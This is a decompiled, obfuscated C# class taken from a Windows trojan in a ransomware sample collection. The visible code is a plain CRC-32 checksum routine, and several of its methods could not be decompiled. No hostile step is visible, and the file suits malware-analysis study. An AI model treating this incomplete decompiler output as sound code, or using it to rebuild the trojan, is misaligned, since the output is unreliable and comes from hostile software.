// Decompiled with JetBrains decompiler
// Type: .
// Assembly: !, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5C00FD14-0593-45B6-9F03-9C994C33EAA2
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.Win32.Bublik.dtio-d316929b73aa45bb1c449392f00ca5f4892e575dfa72d6c9315b97e93435424a.exe

using \u0001\u0002;
using System;

namespace \u0001\u0002
{
  internal class \u0001\u0018
  {
    public static readonly uint[] \u0002 = new uint[256];
    private uint \u0001\u001F;

    static \u0001\u0018()
    {
      for (uint index1 = 0; index1 < 256U; ++index1)
      {
        uint num = index1;
        for (int index2 = 0; index2 < 8; ++index2)
        {
          if (((int) num & 1) != 0)
            num = num >> 1 ^ 3988292384U;
          else
            num >>= 1;
        }
        \u0001\u0018.\u0002[(IntPtr) index1] = num;
      }
    }

    public void \u0001\u001B() => this.\u0001\u001F = uint.MaxValue;

    public void \u0001\u001C(byte b) => this.\u0001\u001F = \u0001\u0018.\u0002[(int) (byte) this.\u0001\u001F ^ (int) b] ^ this.\u0001\u001F >> 8;

    public void \u0001\u001D(byte[] data, uint offset, uint size)
    {
      for (uint index = 0; index < size; ++index)
        this.\u0001\u001F = \u0001\u0018.\u0002[(int) (byte) this.\u0001\u001F ^ (int) data[(IntPtr) (offset + index)]] ^ this.\u0001\u001F >> 8;
    }

    public uint \u0001\u001A()
    {
      // ISSUE: unable to decompile the method.
    }

    private static uint \u0001\u0019(byte[] data, uint offset, uint size)
    {
      // ISSUE: unable to decompile the method.
    }

    private static bool \u0001\u001E(uint digest, byte[] data, uint offset, uint size)
    {
      // ISSUE: unable to decompile the method.
    }

    public \u0001\u0018()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
